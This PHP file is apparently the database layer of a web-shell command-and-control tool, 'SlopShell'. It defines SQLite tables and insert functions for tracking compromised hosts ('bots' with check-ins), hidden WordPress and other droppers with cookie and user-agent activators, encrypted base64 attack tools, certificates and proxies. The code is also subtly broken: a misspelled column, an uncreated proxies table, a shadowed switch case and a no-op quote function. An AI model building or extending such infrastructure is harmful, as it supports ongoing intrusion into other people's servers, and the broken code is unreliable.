<?php

namespace database;

use PDOException;
use SQLite3;

class slopSqlite extends \SQLite3
{
    public function __construct(string $filename, int $flags = SQLITE3_OPEN_READWRITE | SQLITE3_OPEN_CREATE)
    {
        parent::__construct($filename, $flags);
    }
    public static function escapeString(string $string): string
    {
        return parent::escapeString($string); // TODO: Change the autogenerated stub
    }

    public function busyTimeout(int $milliseconds): bool
    {
        return parent::busyTimeout($milliseconds); // TODO: Change the autogenerated stub
    }

    public function close(): void
    {
        parent::close(); // TODO: Change the autogenerated stub
    }

    public function firstRun(): array
    {
        $success_list = [];
        $prepare_tables = [
            "main" => "CREATE TABLE IF NOT EXISTS sloppy_bots_main(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, datetime TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL, rhost TEXT UNIQUE NOT NULL, uri TEXT NOT NULL DEFAULT '/slopshell.php', uuid TEXT UNIQUE NOT NULL, os_flavor TEXT NOT NULL, check_in INTEGER DEFAULT 0 NOT NULL, agent TEXT NOT NULL DEFAULT 'sp/1.1', cname TEXT NOT NULL DEFAULT '-', cvalue TEXT NOT NULL DEFAULT '-');",
            "droppers" => "CREATE TABLE IF NOT EXISTS sloppy_bots_droppers(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP DEFAULT CURRENT_TIMESTAMP NOT NULL,location_on_disk TEXT UNIQUE NOT NULL, post_var TEXT NOT NULL DEFAULT '-', cookiename TEXT NOT NULL DEFAULT '-', user_agent TEXT NOT NULL DEFAULT 'sp/1.1', dropper_type TEXT NOT NULL DEFAULT '-', uuid TEXT UNIQUE NOT NULL, activator TEXT NOT NULL DEFAULT '-', cookie_val TEXT UNIQUE NOT NULL DEFAULT '-');",
            "tools" => "CREATE TABLE IF NOT EXISTS sloppy_bots_tools(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,tool_name TEXT UNIQUE NOT NULL,target TEXT NOT NULL,base64_encoded_tool TEXT UNIQUE NOT NULL,keys TEXT UNIQUE,tags TEXT UNIQUE,iv TEXT UNIQUE,cipher TEXT NOT NULL DEFAULT 'NONE',hmac_hash TEXT UNIQUE,lang TEXT NOT NULL,is_encrypted BOOLEAN DEFAULT false);",
            "certs" => "CREATE TABLE IF NOT EXISTS sloppy_bots_certs(id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,date_added TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP,cert_location_on_disk TEXT UNIQUE NOT NULL,base64_encoded_cert TEXT UNIQUE NOT NULL,csr TEXT UNIQUE,pub TEXT UNIQUE,pem TEXT UNIQUE,cipher TEXT DEFAULT '-',is_encrypted BOOLEAN DEFAULT FALSE,priv_key_pass TEXT UNIQUE NOT NULL,rotated BOOLEAN NOT NULL DEFAULT FALSE);",
        ];
        foreach ($prepare_tables as $table => $createCall) {
            if ($this->exec($createCall) === true) {
                $success_list[$table] = "Successful!\n";
            } else {
                $success_list[$table] = "Not successful.\n";
            }
        }
        return $success_list;
    }

    private function insertPress($data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, cookie_val, user_agent, uuid, dropper_type) VALUES (:location_on_disk,:cookiename,:cookie_val,:user_agent,:uuid,:dropper_type)");
        return $stmt->execute([
                'location_on_disk' => $data['zip'],
                'cookiename' => $data['CookieName'],
                'cookie_val' => $data['CookieVal'],
                'user_agent' => $data['AllowedAgent'],
                'uuid' => $data['UUID'],
                'dropper_type' => 'wordpress'
                ]) !== false;
    }

    private function insertBot($data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_main(rhost, uri, uuidd, os_flavor, check_in) 
                                VALUES (:rhost, :uri, :uuid, :os_flavor, :check_in);");
        return $stmt->execute([
                'rhost' => $data['rhost'],
                'uri' => $data['uri'],
                'uuid' => $data['uuid'],
                'os_flavor' => $data['os_flavor'],
                'check_in' => $data['check_in'] ?? 1
            ]) !== false;
    }

    private function insertDropper( array $data ): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_droppers(location_on_disk, cookiename, user_agent, dropper_type, post_var, activator) VALUES(:location_on_disk,:cookiename,:user_agent,:dropper_type,:post_var,:activator);");
        return $stmt->execute([
                'location_on_disk' => $data['dropper'],
                'cookiename' => $data['cookie_name'],
                'user_agent' => $data['user_agent'],
                'dropper_type' => 'slim_boy',
                'post_var' => $data['post_variable'],
                'activator' => $data['activator']
                ]) !== false;
    }

    private function insertCertificate(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_certs(cert_location_on_disk, base64_encoded_cert, csr, pub, pem, cipher, is_encrypted, priv_key_pass) VALUES (:cert_location_on_disk, :base64_encoded_cert, :csr, :pub, :pem, :cipher, :is_encrypted, :priv_key_pass)");
        return $stmt->execute([
            'cert_location_on_disk' => $data['cert_location'],
            'base64_encoded_cert' =>$data['base64_data'],
            'csr' => $data['csr'],
            'pub' => $data['pub'],
            'pem' => $data['pem'],
            'cipher' => $data['cipher'],
            'is_encrypted' => $data['is_encrypted'],
            'priv_key_pass' => $data['priv_key_pass']
        ]) !== false;
    }

    private function insertProxy(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_proxies(proxy_schema, proxy) VALUES(:schema, :proxy);");
        return $stmt->execute([
                'schema' => $data['proxy_schema'],
                'proxy' => $data['proxy']
        ]) !== false;
    }

    private function insertEncryptedTool(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, keys, tags, iv, cipher, hmac_hash, lang, is_encrypted) VALUES(:tool_name, :target, :b64_encrypted, :keys, :tags, :iv, :cipher, :hmac_hash, :lang, :is_encrypted);");
        return $stmt->execute([
            'tool_name'=> $data['tool_name'],
            'target' => $data['target'],
            'b64_encrypted' => $data['base64_data'],
            'keys' => $data['key'],
            'tags' => $data['tag'],
            'iv' => $data['iv'],
            'cipher' => $data['cipher'],
            'hmac_hash' => $data['hmac_hash'],
            'lang' => $data['lang'],
            'is_encrypted' => $data['is_encrypted']
        ]) !== false;
    }

    private function insertTool(array $data): bool
    {
        $stmt = $this->prepare("INSERT INTO sloppy_bots_tools(tool_name, target, base64_encoded_tool, lang, is_encrypted) VALUES(:tool_name, :target, :base64_encoded_tool, :lang, :is_encrypted);");
        return $stmt->execute([
            'tool_name' => $data['tool_name'],
            'target' => $data['target'],
            'base64_encoded_tool' => $data['base64_data'],
            'lang' => $data['lang'],
            'is_encrypted' => $data['is_encrypted']
        ]);
    }
    public function insertData(array $data): bool
    {
        if (empty($data['action'])) {
            print("Action is empty, cannot handle this.");
            return false;
        }

        try{
            switch (true) {
                case str_contains($data['action'], "add_press"):
                    return $this->insertPress($data);
                case str_contains($data['action'], "add_bot"):
                    return $this->insertBot($data);
                case str_contains($data['action'], 'add_tool'):
                    return $this->insertTool($data);
                case str_contains($data['action'], "add_tool_encrypted"):
                    return $this->insertEncryptedTool($data);
                case str_contains($data['action'], 'add_cert'):
                    return $this->insertCertificate($data);
                case str_contains($data['action'], 'add_dropper'):
                    return $this->insertDropper($data);
                case str_contains($data['action'], 'proxies'):
                    return $this->insertProxy($data);
                default:
                    print("Action was invalid, cannot handle this.");
                    return false;
            }
        } catch (PDOException $e){
            error_log($e->getMessage());
            return false;
        }
    }

    function grabAndFormatOutput()
    {

    }

    public function backup(SQLite3 $destination, string $sourceDatabase = 'main', string $destinationDatabase = 'main'): bool
    {
        return parent::backup($destination, $sourceDatabase, $destinationDatabase); // TODO: Change the autogenerated stub
    }

    public function enableExtendedResultCodes(bool $enable = true): bool
    {
        return parent::enableExtendedResultCodes($enable); // TODO: Change the autogenerated stub
    }

    public function lastExtendedErrorCode(): int
    {
        return parent::lastExtendedErrorCode(); // TODO: Change the autogenerated stub
    }

    public function lastErrorCode(): int
    {
        return parent::lastErrorCode(); // TODO: Change the autogenerated stub
    }

    private function quote(mixed $uri)
    {
        str_replace($uri, "\'", "'");
        str_replace($uri, "\\\"", "\"");
        str_replace($uri, "", ";");
        return $uri;
    }
}